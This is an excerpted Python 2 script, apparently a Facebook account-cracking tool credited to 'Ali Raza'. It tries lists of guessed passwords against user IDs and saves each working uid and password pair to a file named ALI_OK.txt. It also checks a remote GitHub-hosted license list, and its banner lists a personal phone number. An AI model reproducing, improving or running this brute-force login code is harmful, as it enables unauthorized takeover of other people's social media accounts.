...
os.system('git pull')
os.system('clear')
logo = '\n\x1b[1;92m              \n\x1b[1;92m                      \n\x1b[1;96m                        \n\x1b[1;92m     --------------------------------------------- \n\x1b[1;97m     --------------------------------------------- \n\x1b[1;93m    ---------------------------------------------  \n\x1b[1;96m     --------------------------------------------- \n\x1b[1;94m  ---------------------------------------------  \n\x1b[1;93m                      \n\x1b[1;92m         Mr Hussaini~                       \n\x1b[1;91m-----------------------------------------------\n\x1b[1;97m\xe2\x9e\xa3 Author : Ali Raza x ?????\n\x1b[1;97m\xe2\x9e\xa3 Yt : Technical Raza\n\x1b[1;97m\xe2\x9e\xa3 WP NO: +923047269778\n\x1b[1;91m-----------------------------------------------'
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/mrhussaini1/Ali/main/Server.txt').text
    if to in r:
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mAli Raza king Of Facebook\x1b[1;91m'
    print 47 * '-'
                ...
                if 'loc' in q:
                    ...
                    if 'loc' in q:
                        ...
                        if 'loc' in q:
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[ALI-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/ALI_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[ALI-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/ALI_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[ALI-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/ALI_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[ALI-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/ALI_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            ...
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[ALI-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/ALI_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[ALI-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/ALI_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
...
def c_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mAli King Of Fcebook\x1b[1;91m'
    print 47 * '-'
...
def n_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94mAli King Of Facebook\x1b[1;91m'
    print 47 * '-'
